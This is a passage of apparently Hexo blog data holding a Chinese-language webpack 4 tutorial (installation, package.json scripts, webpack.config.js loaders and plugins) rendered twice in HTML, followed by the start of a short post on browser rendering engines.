`webpack-cli`</span><br></pre></td></tr></table></figure></p>\n<p>为什么<code>webpack</code>分为<code>两个文件</code>呢？<br>在<code>webpack3</code>中，webpack本身和它的cli以前都是在同一个包中;<br>但在第4版中，他们已经将两者分开来更好地管理它们。</p>\n<p>新建一个<code>webpack的文件夹</code>，在其下新建一个<code>try-webpack</code> ( 防止<code>init</code>时项目名和安装包同名 ) 并初始化和配置webpack。</p>\n<blockquote>\n<p>npm init -y  // -y 默认所有的配置</p>\n<p>yarn add webpack webpack-cli -D // -D webpack安装在devDependencies环境中</p>\n</blockquote>\n<h2 id=\"二、部署webpack\"><a href=\"#二、部署webpack\" class=\"headerlink\" title=\"二、部署webpack\"></a><span style=\"color:red\">二、部署webpack</span></h2><p>在上面搭建好的环境项目中，我们来到<code>package.json</code>里配置我们的<code>scripts</code>,让webpack<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;scripts&quot;: &#123;</span><br><span class=\"line\">        &quot;build&quot;: &quot;webpack --mode production&quot; //我们在这里配置，就可以使用npm run build 启动我们的webpack</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;devDependencies&quot;: &#123;</span><br><span class=\"line\">        &quot;webpack&quot;: &quot;^4.16.0&quot;,</span><br><span class=\"line\">        &quot;webpack-cli&quot;: &quot;^3.0.8&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>配置好我们<code>webpack的运行环境</code>时，联想下<code>vue-cli</code>。<br>平时使用<code>vue-cli</code>会自动帮我们配置并生成项目。<br>我们在<code>src</code>下进行项目的开发，最后 <code>npm run build</code> 打包生成我们的dist的目录。<br>不知道你是否还记得，还是让我们进入下一节让我们感受下这其中的整个流程吧。</p>\n<h2 id=\"三、npm-run-build-发生了什么\"><a href=\"#三、npm-run-build-发生了什么\" class=\"headerlink\" title=\"三、npm run build 发生了什么\"></a><span style=\"color:red\">三、npm run build 发生了什么</span></h2><p>在我们的根项目下<code>try-webpack</code>新建一个<code>src</code>目录。在<code>src</code>目录下新建一个<code>index.js</code>文件。<br>在里面我们可以写任意的代码，以案例为主:</p>\n<blockquote>\n<p>const a = 1;</p>\n</blockquote>\n<p>写完后, 在终端运行命令 <code>npm run build</code> ；会发现新增了一个<code>dist</code>目录，里面存放着webpack打包好的<code>main.js</code>文件。<br>这和我们在<code>vue-cli</code>里操作是一样的。</p>\n<h2 id=\"四、webpackp配置流程篇\"><a href=\"#四、webpackp配置流程篇\" class=\"headerlink\" title=\"四、webpackp配置流程篇\"></a><span style=\"color:red\">四、webpackp配置流程篇</span></h2><p>我们在开发是一般会打包src下的什么文件呢？我们可以回忆一下，其实vue-cli项目src下不就这几点嘛：</p>\n<ul>\n<li>发布时需要的html，css，js</li>\n<li>css预编译器stylus，less，sass</li>\n<li>es6的高级语法</li>\n<li>图片资源.png，.gif，.ico，.jpg</li>\n<li>文件间的require</li>\n<li>别名@等修饰符</li>\n</ul>\n<p>分几点来讲解webpack中<code>webpack.config.js</code>的配置，跟着脚步，一步一步的来完成我们的流程线。</p>\n<h3 id=\"✍️Html在webpack中的配置\"><a href=\"#✍️Html在webpack中的配置\" class=\"headerlink\" title=\"✍️Html在webpack中的配置\"></a><strong>✍️Html在webpack中的配置</strong></h3><p>在项目的根目录<code>try-webpack</code>下新建<code>webpack.config.js</code>文件，以<code>commonJS</code>模块化机制向外输出,并且新建一个<code>index.html</code>。</p>\n<blockquote>\n<p>module.exports = { }</p>\n</blockquote>\n<p>配置我们的入口<code>entry</code>，在<code>vue-cli</code>里相当于根目录下的<code>main.js</code>，我们的出口<code>output</code>。<br>我们可以把<code>webpack</code>理解为一个工厂，进入相当于把各种各样的原料放进我们的工厂了，然后工厂进行一系列的打包操作把打包好的东西，向外输出，然后就可以去出售了(上线)。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const path = require(&apos;path&apos;); // 引入我们的node模块里的path</span><br><span class=\"line\">// 测试下 console.log(path.resolve(__dirname,&apos;dist&apos;)); // 物理地址拼接</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">    entry: &apos;./src/index.js&apos;, // 入口文件  在vue-cli main.js</span><br><span class=\"line\">    output: &#123; // webpack如何向外输出</span><br><span class=\"line\">        path: path.resolve(__dirname, &apos;dist&apos;), // 定位，输出文件的目标路径</span><br><span class=\"line\">        filename: &apos;[name].js&apos; // 文件名[name].js默认，也可自行配置</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>HTML打包</strong> 需要 <strong>安装/引入</strong> <code>html-webpack-plugin</code></p>\n<blockquote>\n<p>yarn add html-webpack-plugin -D // 在开发环境中安装</p>\n<p>const HtmlWebpackPlugin = require(‘html-webpack-plugin’)  //引入打包我们的HTML</p>\n</blockquote>\n<p>在module.exports里配置我们的plugins(插件):<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins: [  //插进的引用, 压缩，分离美化</span><br><span class=\"line\">    new HtmlWebpackPlugin(&#123;  // 将模板的头部和尾部添加css和js模板, dist 目录发布到服务器上，项目包。可以直接上线</span><br><span class=\"line\">        file: &apos;index.html&apos;, // 打造单页面运用 最后运行的不是这个</span><br><span class=\"line\">        template: &apos;src/index.html&apos;  // vue-cli放在跟目录下</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">],</span><br></pre></td></tr></table></figure></p>\n<p>配置好后，在终端输入<code>npm run dev</code>后webpack将我们的html打包好并且<code>自动将js引进</code>来。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;p class=&quot;main&quot;&gt;Hello World&lt;/p&gt;</span><br><span class=\"line\">    &lt;script type=&quot;text/javascript&quot; src=&quot;main.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>\n<p><code>live-sever</code> 我们的dist目录，启动一个<code>8080端口</code>，我们就可以看到我们的Hello World了。这就是我们上线版的页面。</p>\n<h3 id=\"css在webpack中的配置\"><a href=\"#css在webpack中的配置\" class=\"headerlink\" title=\"css在webpack中的配置\"></a><strong>css在webpack中的配置</strong></h3><p>在<code>vue-cli</code>里，我们可以使用css去写我们的样式，也可以使用高级<code>stylus，less，sass</code>等预编译器。这里就以less为例，看看webpack怎么将他打包成一个css。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.main &#123;</span><br><span class=\"line\">  color: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在<code>src目录</code>下新建我们的<code>style.less</code>文件，在配置之前我们需要<code>npm安装</code>我们的<code>css-loader</code>和<code>sass-loader</code>， <code>sass、less</code></p>\n<blockquote>\n<p>yarn add css-loader less less-loader style-loader -D</p>\n</blockquote>\n<p>执行完上述命令我们在 <code>packge.json</code> 里可以看到我们的配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;devDependencies&quot;: &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;css-loader&quot;: &quot;^1.0.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;html-webpack-plugin&quot;: &quot;^3.2.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;sass&quot;: &quot;^1.9.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;sass-loader&quot;: &quot;^7.0.3&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;webpack&quot;: &quot;^4.16.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;webpack-cli&quot;: &quot;^3.0.8&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>安装好后，开始配置<code>webpack.config.js</code>文件。<br>这里申明一下，css 在 dist 目录下 需要和 <code>HTML</code>分离，还需引入<code>extract-text-webpack-plugin</code>，先安装</p>\n<blockquote>\n<p>yarn add extract-text-webpack-plugin -D</p>\n<p>npm install extract-text-webpack-plugin -D</p>\n</blockquote>\n<p>这里有一个坑，<code>extract-text-webpack-plugin</code>在<code>4.0并不支持</code>这样的安装，可自行chrome。<br>换一种方式,选择<code>4.00-beta.0版本</code></p>\n<blockquote>\n<p>yarn add extract-text-webpack-plugin@last -D</p>\n</blockquote>\n<p>来到我们的<code>module.exports</code>里，完成moudel的配置</p>\n<hr>\n<p><a href=\"https://mp.weixin.qq.com/s/kZ9Y99yO5_CmUzKjP_M4Nw\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"webpack详解\"><a href=\"#webpack详解\" class=\"headerlink\" title=\"webpack详解\"></a>webpack详解</h2><p><a href=\"https://segmentfault.com/a/1190000015611030\" target=\"_blank\" rel=\"noopener\">原文出处: WsmDyj</a>  </p>\n<p>webpack是一个<code>打包工具</code>，他的宗旨是<code>一切静态资源即可打包</code>。<br>有人就会问为什么要webpack？webpack是现代前端技术的基石，常规的开发方式，比如jquery,html,css静态网页开发已经落后了(也可以配合webpack技术开发)。现在是MVVM的时代，数据驱动界面。webpack将现代js开发中的各种新型有用的技术，集合打包。  </p>\n<p><strong>webpack生态圈:</strong><br><img src=\"https://mmbiz.qpic.cn/mmbiz_jpg/zPh0erYjkib3EVfKmEFGibiaqqKlnWmGLMouXAfJQL0cWMtd2pZt67AeZDxjM3VZ3sbbUVccbqTPA6Pa6T2jvTafA/640\" alt=\"webpack生态圈\"></p>\n<p><strong>webpack4.0的配置(实际上是<code>Node</code>干活)</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const path = require(&apos;path&apos;); //引入node的path模块</span><br><span class=\"line\">const webpack = require(&apos;webpack&apos;); //引入webpack,使用lodash</span><br><span class=\"line\">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;) //将html打包</span><br><span class=\"line\">const ExtractTextPlugin = require(&apos;extract-text-webpack-plugin&apos;) //打包的css拆分,将一部分抽离出来  </span><br><span class=\"line\">const CopyWebpackPlugin = require(&apos;copy-webpack-plugin&apos;)</span><br><span class=\"line\">// console.log(path.resolve(__dirname,&apos;dist&apos;)); // 物理地址拼接</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">    entry: &apos;./src/index.js&apos;, //入口文件  在vue-cli main.js</span><br><span class=\"line\">    output: &#123; //webpack如何输出</span><br><span class=\"line\">        path: path.resolve(__dirname, &apos;dist&apos;), //定位，输出文件的目标路径</span><br><span class=\"line\">        filename: &apos;[name].js&apos;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    module: &#123; //模块的相关配置</span><br><span class=\"line\">        rules: [ //根据文件的后缀提供一个loader,解析规则</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: /\\.js$/, //es6 =&gt; es5</span><br><span class=\"line\">                include: [</span><br><span class=\"line\">                    path.resolve(__dirname, &apos;src&apos;)</span><br><span class=\"line\">                ],</span><br><span class=\"line\">                // exclude:[], 不匹配选项（优先级高于test和include）</span><br><span class=\"line\">                use: &apos;babel-loader&apos;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: /\\.less$/,</span><br><span class=\"line\">                use: ExtractTextPlugin.extract(&#123;</span><br><span class=\"line\">                    fallback: &apos;style-loader&apos;,</span><br><span class=\"line\">                    use: [</span><br><span class=\"line\">                        &apos;css-loader&apos;,</span><br><span class=\"line\">                        &apos;less-loader&apos;</span><br><span class=\"line\">                    ]</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123; //图片loader</span><br><span class=\"line\">                test: /\\.(png|jpg|gif)$/,</span><br><span class=\"line\">                use: [</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        loader: &apos;file-loader&apos; //根据文件地址加载文件</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    resolve: &#123; // 解析模块的可选项  </span><br><span class=\"line\">        // modules: [ ] // 模块的查找目录 配置其他的css等文件</span><br><span class=\"line\">        extensions: [&quot;.js&quot;, &quot;.json&quot;, &quot;.jsx&quot;, &quot;.less&quot;, &quot;.css&quot;], //用到文件的扩展名</span><br><span class=\"line\">        alias: &#123; //模快别名列表</span><br><span class=\"line\">            utils: path.resolve(__dirname, &apos;src/utils&apos;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    plugins: [ // 插进的引用, 压缩，分离美化</span><br><span class=\"line\">        new ExtractTextPlugin(&apos;[name].css&apos;), // [name] 默认  也可以自定义name  声明使用</span><br><span class=\"line\">        new HtmlWebpackPlugin(&#123; // 将模板的头部和尾部添加css和js模板,dist 目录发布到服务器上，项目包。可以直接上线</span><br><span class=\"line\">            file: &apos;index.html&apos;, // 打造单页面运用 最后运行的不是这个</span><br><span class=\"line\">            template: &apos;src/index.html&apos; // vue-cli放在根目录下</span><br><span class=\"line\">        &#125;),</span><br><span class=\"line\">        new CopyWebpackPlugin([ // src下其他的文件直接复制到dist目录下</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                from: &apos;src/assets/favicon.ico&apos;,</span><br><span class=\"line\">                to: &apos;favicon.ico&apos;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]),</span><br><span class=\"line\">        new webpack.ProvidePlugin(&#123; //引用框架 jquery  lodash工具库是很多组件会复用的，省去了import</span><br><span class=\"line\">            &apos;_&apos;: &apos;lodash&apos; //引用webpack</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    devServer: &#123; //服务于webpack-dev-server  内部封装了一个express</span><br><span class=\"line\">        port: &apos;8080&apos;,</span><br><span class=\"line\">        before(app) &#123;</span><br><span class=\"line\">            app.get(&apos;/api/test.json&apos;, (req, res) =&gt; &#123;</span><br><span class=\"line\">                res.json(&#123;</span><br><span class=\"line\">                    code: 200,</span><br><span class=\"line\">                    message: &apos;Hello World&apos;</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"一、前端环境搭建\"><a href=\"#一、前端环境搭建\" class=\"headerlink\" title=\"一、前端环境搭建\"></a><span style=\"color:red\">一、前端环境搭建</span></h2><p>使用 <code>npm</code> 或 <code>yarn</code> 来安装 <code>webpack</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install `webpack` `webpack-cli` -g </span><br><span class=\"line\"># 或者 || </span><br><span class=\"line\">yarn global add `webpack` `webpack-cli`</span><br></pre></td></tr></table></figure></p>\n<p>为什么<code>webpack</code>分为<code>两个文件</code>呢？<br>在<code>webpack3</code>中，webpack本身和它的cli以前都是在同一个包中;<br>但在第4版中，他们已经将两者分开来更好地管理它们。</p>\n<p>新建一个<code>webpack的文件夹</code>，在其下新建一个<code>try-webpack</code> ( 防止<code>init</code>时项目名和安装包同名 ) 并初始化和配置webpack。</p>\n<blockquote>\n<p>npm init -y  // -y 默认所有的配置</p>\n<p>yarn add webpack webpack-cli -D // -D webpack安装在devDependencies环境中</p>\n</blockquote>\n<h2 id=\"二、部署webpack\"><a href=\"#二、部署webpack\" class=\"headerlink\" title=\"二、部署webpack\"></a><span style=\"color:red\">二、部署webpack</span></h2><p>在上面搭建好的环境项目中，我们来到<code>package.json</code>里配置我们的<code>scripts</code>,让webpack<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;scripts&quot;: &#123;</span><br><span class=\"line\">        &quot;build&quot;: &quot;webpack --mode production&quot; //我们在这里配置，就可以使用npm run build 启动我们的webpack</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;devDependencies&quot;: &#123;</span><br><span class=\"line\">        &quot;webpack&quot;: &quot;^4.16.0&quot;,</span><br><span class=\"line\">        &quot;webpack-cli&quot;: &quot;^3.0.8&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>配置好我们<code>webpack的运行环境</code>时，联想下<code>vue-cli</code>。<br>平时使用<code>vue-cli</code>会自动帮我们配置并生成项目。<br>我们在<code>src</code>下进行项目的开发，最后 <code>npm run build</code> 打包生成我们的dist的目录。<br>不知道你是否还记得，还是让我们进入下一节让我们感受下这其中的整个流程吧。</p>\n<h2 id=\"三、npm-run-build-发生了什么\"><a href=\"#三、npm-run-build-发生了什么\" class=\"headerlink\" title=\"三、npm run build 发生了什么\"></a><span style=\"color:red\">三、npm run build 发生了什么</span></h2><p>在我们的根项目下<code>try-webpack</code>新建一个<code>src</code>目录。在<code>src</code>目录下新建一个<code>index.js</code>文件。<br>在里面我们可以写任意的代码，以案例为主:</p>\n<blockquote>\n<p>const a = 1;</p>\n</blockquote>\n<p>写完后, 在终端运行命令 <code>npm run build</code> ；会发现新增了一个<code>dist</code>目录，里面存放着webpack打包好的<code>main.js</code>文件。<br>这和我们在<code>vue-cli</code>里操作是一样的。</p>\n<h2 id=\"四、webpackp配置流程篇\"><a href=\"#四、webpackp配置流程篇\" class=\"headerlink\" title=\"四、webpackp配置流程篇\"></a><span style=\"color:red\">四、webpackp配置流程篇</span></h2><p>我们在开发是一般会打包src下的什么文件呢？我们可以回忆一下，其实vue-cli项目src下不就这几点嘛：</p>\n<ul>\n<li>发布时需要的html，css，js</li>\n<li>css预编译器stylus，less，sass</li>\n<li>es6的高级语法</li>\n<li>图片资源.png，.gif，.ico，.jpg</li>\n<li>文件间的require</li>\n<li>别名@等修饰符</li>\n</ul>\n<p>分几点来讲解webpack中<code>webpack.config.js</code>的配置，跟着脚步，一步一步的来完成我们的流程线。</p>\n<h3 id=\"✍️Html在webpack中的配置\"><a href=\"#✍️Html在webpack中的配置\" class=\"headerlink\" title=\"✍️Html在webpack中的配置\"></a><strong>✍️Html在webpack中的配置</strong></h3><p>在项目的根目录<code>try-webpack</code>下新建<code>webpack.config.js</code>文件，以<code>commonJS</code>模块化机制向外输出,并且新建一个<code>index.html</code>。</p>\n<blockquote>\n<p>module.exports = { }</p>\n</blockquote>\n<p>配置我们的入口<code>entry</code>，在<code>vue-cli</code>里相当于根目录下的<code>main.js</code>，我们的出口<code>output</code>。<br>我们可以把<code>webpack</code>理解为一个工厂，进入相当于把各种各样的原料放进我们的工厂了，然后工厂进行一系列的打包操作把打包好的东西，向外输出，然后就可以去出售了(上线)。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const path = require(&apos;path&apos;); // 引入我们的node模块里的path</span><br><span class=\"line\">// 测试下 console.log(path.resolve(__dirname,&apos;dist&apos;)); // 物理地址拼接</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">    entry: &apos;./src/index.js&apos;, // 入口文件  在vue-cli main.js</span><br><span class=\"line\">    output: &#123; // webpack如何向外输出</span><br><span class=\"line\">        path: path.resolve(__dirname, &apos;dist&apos;), // 定位，输出文件的目标路径</span><br><span class=\"line\">        filename: &apos;[name].js&apos; // 文件名[name].js默认，也可自行配置</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>HTML打包</strong> 需要 <strong>安装/引入</strong> <code>html-webpack-plugin</code></p>\n<blockquote>\n<p>yarn add html-webpack-plugin -D // 在开发环境中安装</p>\n<p>const HtmlWebpackPlugin = require(‘html-webpack-plugin’)  //引入打包我们的HTML</p>\n</blockquote>\n<p>在module.exports里配置我们的plugins(插件):<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins: [  //插进的引用, 压缩，分离美化</span><br><span class=\"line\">    new HtmlWebpackPlugin(&#123;  // 将模板的头部和尾部添加css和js模板, dist 目录发布到服务器上，项目包。可以直接上线</span><br><span class=\"line\">        file: &apos;index.html&apos;, // 打造单页面运用 最后运行的不是这个</span><br><span class=\"line\">        template: &apos;src/index.html&apos;  // vue-cli放在跟目录下</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">],</span><br></pre></td></tr></table></figure></p>\n<p>配置好后，在终端输入<code>npm run dev</code>后webpack将我们的html打包好并且<code>自动将js引进</code>来。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;p class=&quot;main&quot;&gt;Hello World&lt;/p&gt;</span><br><span class=\"line\">    &lt;script type=&quot;text/javascript&quot; src=&quot;main.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>\n<p><code>live-sever</code> 我们的dist目录，启动一个<code>8080端口</code>，我们就可以看到我们的Hello World了。这就是我们上线版的页面。</p>\n<h3 id=\"css在webpack中的配置\"><a href=\"#css在webpack中的配置\" class=\"headerlink\" title=\"css在webpack中的配置\"></a><strong>css在webpack中的配置</strong></h3><p>在<code>vue-cli</code>里，我们可以使用css去写我们的样式，也可以使用高级<code>stylus，less，sass</code>等预编译器。这里就以less为例，看看webpack怎么将他打包成一个css。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.main &#123;</span><br><span class=\"line\">  color: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在<code>src目录</code>下新建我们的<code>style.less</code>文件，在配置之前我们需要<code>npm安装</code>我们的<code>css-loader</code>和<code>sass-loader</code>， <code>sass、less</code></p>\n<blockquote>\n<p>yarn add css-loader less less-loader style-loader -D</p>\n</blockquote>\n<p>执行完上述命令我们在 <code>packge.json</code> 里可以看到我们的配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;devDependencies&quot;: &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;css-loader&quot;: &quot;^1.0.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;html-webpack-plugin&quot;: &quot;^3.2.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;sass&quot;: &quot;^1.9.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;sass-loader&quot;: &quot;^7.0.3&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;webpack&quot;: &quot;^4.16.0&quot;,</span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;webpack-cli&quot;: &quot;^3.0.8&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>安装好后，开始配置<code>webpack.config.js</code>文件。<br>这里申明一下，css 在 dist 目录下 需要和 <code>HTML</code>分离，还需引入<code>extract-text-webpack-plugin</code>，先安装</p>\n<blockquote>\n<p>yarn add extract-text-webpack-plugin -D</p>\n<p>npm install extract-text-webpack-plugin -D</p>\n</blockquote>\n<p>这里有一个坑，<code>extract-text-webpack-plugin</code>在<code>4.0并不支持</code>这样的安装，可自行chrome。<br>换一种方式,选择<code>4.00-beta.0版本</code></p>\n<blockquote>\n<p>yarn add extract-text-webpack-plugin@last -D</p>\n</blockquote>\n<p>来到我们的<code>module.exports</code>里，完成moudel的配置</p>\n<hr>\n<p><a href=\"https://mp.weixin.qq.com/s/kZ9Y99yO5_CmUzKjP_M4Nw\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"五大浏览器 四大内核","date":"2018-05-12T02:51:40.000Z","_content":"## 下各常用浏览器所使用的内核。 \n\n1、IE浏览器内核：Trident内核，也是俗称的IE内核；\n\n2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； \n\n3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； \n\n4、Safari浏览器内核：Webkit内核； \n\n5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； 